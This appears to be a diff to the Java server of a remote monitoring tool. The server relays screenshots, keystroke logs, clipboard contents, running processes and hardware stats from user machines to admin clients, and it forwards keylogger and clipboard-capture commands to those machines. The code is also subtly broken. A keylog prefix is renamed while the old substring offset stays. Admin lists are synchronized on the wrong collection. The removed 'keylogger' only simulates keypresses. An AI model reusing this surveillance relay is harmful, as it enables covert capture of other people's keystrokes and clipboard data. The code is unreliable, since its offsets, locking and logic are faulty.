@@ -134,15 +134,30 @@ public class Server {
                         startSendingScreenshots();
                     } else if (inputLine.equals("STOP_VIDEO")) {
                         stopSendingScreenshots();
-                    } else if (inputLine.startsWith("KEYLOG:")) {
+                    } else if (inputLine.startsWith("KEYLOGS:")) {
                         String keylog = inputLine.substring(7);
                         sendKeylogToAdmins(keylog);
                     } else if (inputLine.startsWith("STOPKEYLOGGER")) {
                         stopKeylogging();
                     } else if (inputLine.startsWith("RUNNING_APPLICATIONS:")) {
                          String process = inputLine.substring(21);
-                       sendRunningApplicationsToAdmins(getRunningProcess());
-                           
+                       sendRunningApplicationsToAdmins(getRunningProcess());                                              
+                    }else if (inputLine.startsWith("CLIPBOARD:")) {
+                       String clipboard = inputLine.substring(10);
+                       sendClipboardToAdmins(clipboard);
+                    }
+                    
+                    
+                    
+                    else if (inputLine.startsWith("CPU_INFO:")) {
+                        String cpu = inputLine.substring(9);
+                        sendCPUToAdmins(cpu);
+                    }else if (inputLine.startsWith("RAM_INFO:")) {
+                        String ram = inputLine.substring(9);
+                        sendRAMToAdmins(ram);
+                    }else if (inputLine.startsWith("DISK_INFO:")) {
+                        String disk = inputLine.substring(10);
+                        sendDISKToAdmins(disk);
                     }
                     
                 }
@@ -174,6 +189,28 @@ public class Server {
                 }
             }
         }
+        
+        public void sendCPUToAdmins(String cpu) {
+            synchronized (userClients) {
+                for (AdminHandler admin : adminClients) {
+                    admin.sendSystemCPU(cpu);
+                }
+            }
+        }
+        public void sendRAMToAdmins(String ram) {
+            synchronized (userClients) {
+                for (AdminHandler admin : adminClients) {
+                    admin.sendSystemRAM(ram);
+                }
+            }
+        }
+        public void sendDISKToAdmins(String disk) {
+            synchronized (userClients) {
+                for (AdminHandler admin : adminClients) {
+                    admin.sendSystemDisk(disk);
+                }
+            }
+        }
 
         public void sendScreenshotToAdmins(String base64Image) {
             synchronized (userClients) {
@@ -190,8 +227,16 @@ public class Server {
                 }
             }
         }
-
-      
+        private void sendClipboardToAdmins(String clipboard) {
+            synchronized (userClients) {
+                for (AdminHandler admin : adminClients) {
+                    admin.sendClipboard(clipboard);
+                }
+            }
+        }
+        private void stopKeylogging() {
+             sendingKeylogger = false;
+        }
 
         public void startSendingScreenshots() {
             sendingScreenshots = true;
@@ -229,40 +274,6 @@ public class Server {
             }
         }
 
-        private void startKeylogging() {
-        if (!sendingKeylogger) {
-            sendingKeylogger = true;
-            new Thread(() -> {
-                try {
-                    Robot robot = new Robot();
-                    while (sendingKeylogger) {
-                        for (int keyEvent = KeyEvent.VK_A; keyEvent <= KeyEvent.VK_Z; keyEvent++) {
-                            if (sendingKeylogger) {
-                                robot.keyPress(keyEvent);
-                                robot.keyRelease(keyEvent);
-                                String keylog = KeyEvent.getKeyText(keyEvent);
-                                sendCommand("KEYLOG:" + keylog);
-                            } else {
-                                break;
-                            }
-                            try {
-                                Thread.sleep(100); // Đợi giữa các sự kiện phím
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
-                            }
-                        }
-                    }
-                } catch (AWTException e) {
-                    e.printStackTrace();
-                }
-            }).start();
-        }
-    }
-
-    private void stopKeylogging() {
-        sendingKeylogger = false;
-    }
-
        
 
     private String getRunningProcess() {
@@ -285,6 +296,7 @@ public class Server {
         return "";
     }
 }
+     
 
     
     public void sendRunningApplicationsToAdmins(String runningApplications) {
@@ -293,7 +305,11 @@ public class Server {
             admin.sendRunningApplications(runningApplications);
         }
     }
+    
+    
 }
+
+        
 
        
 
@@ -334,11 +350,28 @@ public class Server {
             }
         }
 
-        public void sendSystemInfo(String info) {
+        public void sendSystemInfo(String osInfo) {
             if (out != null) {
-                out.println(info);
+                out.println("OS_INFO:" + osInfo);
             }
         }
+        
+        public void sendSystemCPU(String cpu) {
+            if (out != null) {
+                out.println("CPU_INFO:" + cpu);
+            }
+        }
+         public void sendSystemRAM(String ram) {
+            if (out != null) {
+                out.println("RAM_INFO:" + ram);
+            }
+        }
+         public void sendSystemDisk(String disk) {
+            if (out != null) {
+                out.println("DISK_INFO:" + disk);
+            }
+        }
+         
 
         public void sendScreenshot(String base64Image) {
             if (out != null) {
@@ -348,12 +381,23 @@ public class Server {
 
         public void sendKeylog(String keylog) {
             if (out != null) {
-                out.println("KEYLOG:" + keylog);
+                out.println("KEYLOGS:" + keylog);
             }
+        }
+         private void sendClipboard(String clipboard) {
+              if (out != null) {
+                out.println("CLIPBOARD:" + clipboard);
+            }
+            
         }
         public void sendRunningApplications(String runningApplications) {    
             if (out != null) {
                 out.println("RUNNING_APPLICATIONS:" + runningApplications);
+            }
+        }
+         public void sendKillApplication(String message) {
+            if (out != null) {
+                out.println("KILL_PROCESS_RESULT:" + message);
             }
         }
 
@@ -365,8 +409,9 @@ public class Server {
             
             } else if (clientMessage.startsWith("STARTKEYLOGGER")) {
                 for (UserHandler user : userClients) {
-                    user.sendCommand("STARTKEYLLOGER");
+                    user.sendCommand("STARTKEYLOGGER");
                 }
+                
             } else if (clientMessage.startsWith("SCREENSHOT")) {
                 for (UserHandler user : userClients) {
                     user.sendCommand("SCREENSHOT");
@@ -387,17 +432,20 @@ public class Server {
                 for (UserHandler user : userClients) {
                     user.sendCommand("GET_RUNNING_APPLICATIONS");
                 }
-            } else if (clientMessage.startsWith("STARTKEYLOGGER")) {
+            }else if (clientMessage.startsWith("PERFORMANCE")) {
                 for (UserHandler user : userClients) {
-                    user.sendCommand("STARTKEYLOGGER");
+                    user.sendCommand("PERFORMANCE");
                 }
-            } else if (clientMessage.startsWith("STOPKEYLOGGER")) {
+            }else if (clientMessage.startsWith("CLIPBOARD")) {
                 for (UserHandler user : userClients) {
-                    user.sendCommand("STOPKEYLOGGER");
+                    user.sendCommand("CLIPBOARD");
                 }
-            }
         }
+        
 
         
+    }
+
+       
     }
 }
